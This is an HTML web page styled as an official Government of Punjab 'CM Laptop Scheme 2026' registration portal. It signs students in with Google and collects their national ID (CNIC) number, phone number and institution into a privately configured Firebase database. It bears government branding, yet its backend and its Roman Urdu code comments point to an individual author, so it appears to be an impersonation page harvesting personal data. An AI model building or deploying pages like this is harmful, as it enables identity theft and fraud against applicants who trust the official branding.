<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CM Punjab Laptop Scheme 2026 Portal</title>
    
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>

    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background-color: #f0f2f5; }
        .header { background-color: #006633; color: white; padding: 25px; text-align: center; border-bottom: 6px solid #ffcc00; }
        .container { max-width: 450px; margin: 30px auto; background: white; padding: 35px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
        h2 { color: #006633; margin-bottom: 10px; }
        .google-btn { display: flex; align-items: center; justify-content: center; background: white; color: #444; border: 1px solid #ddd; padding: 12px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; margin-top: 20px; }
        .google-btn:hover { background: #f9f9f9; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .google-btn img { width: 20px; margin-right: 12px; }
        #form-section { display: none; text-align: left; margin-top: 20px; }
        label { display: block; margin-top: 15px; font-weight: 600; color: #333; }
        input { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
        .submit-btn { width: 100%; padding: 15px; background-color: #006633; color: white; border: none; margin-top: 25px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .footer { text-align: center; color: #777; font-size: 12px; margin-top: 40px; padding-bottom: 20px; }
        .user-profile { margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
        .user-profile img { width: 50px; border-radius: 50%; }
    </style>
</head>
<body>

<div class="header">
    <h1>Government of Punjab</h1>
    <p>Chief Minister Laptop Scheme 2026</p>
</div>

<div class="container">
    <div id="login-section">
        <h2>Student Login</h2>
        <p>Please login with your Google account to continue registration.</p>
        <button class="google-btn" onclick="login()">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg">
            Continue with Google
        </button>
    </div>

    <div id="form-section">
        <div class="user-profile">
            <img id="user-pic" src="">
            <p>Welcome, <b id="user-name"></b></p>
        </div>
        <h3>Application Form</h3>
        <form id="laptopForm">
            <label>CNIC Number</label>
            <input type="text" id="cnic" placeholder="35202-xxxxxxx-x" required>
            
            <label>University / College Name</label>
            <input type="text" id="university" placeholder="Enter your institution" required>
            
            <label>Phone Number</label>
            <input type="tel" id="phone" placeholder="03xxxxxxxxx" required>

            <button type="submit" class="submit-btn" id="submitBtn">Submit Application</button>
        </form>
    </div>
</div>

<div class="footer">
    <p>&copy; 2026 Higher Education Department | Government of Punjab</p>
</div>

<script>
    // Aapka Provide kiya hua Firebase Code
    const firebaseConfig = {
        apiKey: "AIzaSyAvL5opTN8rSsPfOa4ywnv-flR2AJz-z7s",
        authDomain: "cm-laptop-scheme-2026.firebaseapp.com",
        projectId: "cm-laptop-scheme-2026",
        storageBucket: "cm-laptop-scheme-2026.firebasestorage.app",
        messagingSenderId: "868877730785",
        appId: "1:868877730785:web:bc7fe57b2a4a4c260988a0",
        measurementId: "G-N8WV02XNCX"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.firestore();
    const provider = new firebase.auth.GoogleAuthProvider();

    // 1. Google Login Function
    function login() {
        auth.signInWithPopup(provider).then((result) => {
            const user = result.user;
            showForm(user);
        }).catch((error) => {
            alert("Login Failed: " + error.message);
        });
    }

    // 2. Form Show karne ka function
    function showForm(user) {
        document.getElementById('login-section').style.display = 'none';
        document.getElementById('form-section').style.display = 'block';
        document.getElementById('user-name').innerText = user.displayName;
        document.getElementById('user-pic').src = user.photoURL;
    }

    // 3. Data Save karne ka function
    document.getElementById('laptopForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const btn = document.getElementById('submitBtn');
        btn.innerText = "Submitting...";
        btn.disabled = true;

        const userData = {
            fullName: auth.currentUser.displayName,
            email: auth.currentUser.email,
            cnic: document.getElementById('cnic').value,
            university: document.getElementById('university').value,
            phone: document.getElementById('phone').value,
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
        };

        try {
            await db.collection("applications").add(userData);
            alert("Mubarak ho! Aap ki application submit ho gayi hai.");
            document.getElementById('laptopForm').reset();
        } catch (error) {
            alert("Error: " + error.message);
        } finally {
            btn.innerText = "Submit Application";
            btn.disabled = false;
        }
    });
</script>

</body>
</html>
